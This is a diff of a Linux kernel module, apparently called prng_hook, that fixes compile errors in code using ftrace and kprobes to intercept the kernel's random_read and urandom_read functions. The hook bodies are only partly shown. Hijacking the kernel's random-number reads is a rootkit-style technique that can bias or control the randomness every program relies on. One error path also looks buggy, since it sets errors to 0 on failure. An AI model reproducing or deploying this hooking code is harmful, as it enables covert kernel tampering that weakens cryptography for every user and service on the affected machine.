@@ -41,18 +41,18 @@ static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs
 struct hook_t {
 	const char *name;
 	void *function;
-	void *origin;
+	void *original;
 	unsigned long address;
 	struct ftrace_ops ops;
-}
+};
 
 
 	// // // // // // // //
 	//  Hook Definitions //
 	// // // // // // // //
 
-static asmlinkage ssize_t (*real_random_read) (struct file *file, char __user *buf, size_t bytes_n, loff_t *ppos);
-static asmlinkage ssize_t (*real_urandom_read) (struct file *file, char __user *buf, size_t bytes_n, loff_t *ppos);
+static asmlinkage ssize_t (*real_random_read)(struct file *file, char __user *buf, size_t bytes_n, loff_t *ppos);
+static asmlinkage ssize_t (*real_urandom_read)(struct file *file, char __user *buf, size_t bytes_n, loff_t *ppos);
 
 static asmlinkage ssize_t random_read_hook (struct file *file, char __user *buf, size_t bytes_n, loff_t *ppos) {
 	int bytes_r = real_random_read(file, buf, bytes_n, ppos);
@@ -77,10 +77,10 @@ static asmlinkage ssize_t urandom_read_hook (struct file *file, char __user *buf
 
 static void notrace hook_thunk (unsigned long ip, unsigned long pip,
 				struct ftrace_ops *ops,	struct ftrace_regs *fregs) {
-	struct pt_regs *regs = ftrace_getRegs(fregs);
+	struct pt_regs *regs = ftrace_get_regs(fregs);
 	struct hook_t *hook = container_of(ops, struct hook_t, ops);
 
-	if (!within_module(pip, THIS_MODULE)) { regs->ip = (unsigned long); } 
+	if (!within_module(pip, THIS_MODULE)) { regs->ip = (unsigned long) hook->function; } 
 
 	return;
 }
@@ -107,7 +107,7 @@ int initialize_hooks (struct hook_t *hooks, size_t count) {
 			.symbol_name = hooks[i].name
 		};
 
-		if (register_kprobe(&KP) < 0) { errors = 0; }
+		if (register_kprobe(&kp) < 0) { errors = 0; }
 
 		hooks[i].address = (unsigned long)kp.addr;
 
@@ -156,8 +156,8 @@ kill:
 	// // // // // //
 
 static struct hook_t hooks[] = {
-	HOOK("random_read", random_read_hook, &real_random_hook), 
-	HOOK("urandom_read", urandom_read_hook, &real_urandom_hook),
+	HOOK("random_read", random_read_hook, &real_random_read), 
+	HOOK("urandom_read", urandom_read_hook, &real_urandom_read),
 };
 
 static int __init prng_hook_init (void) {
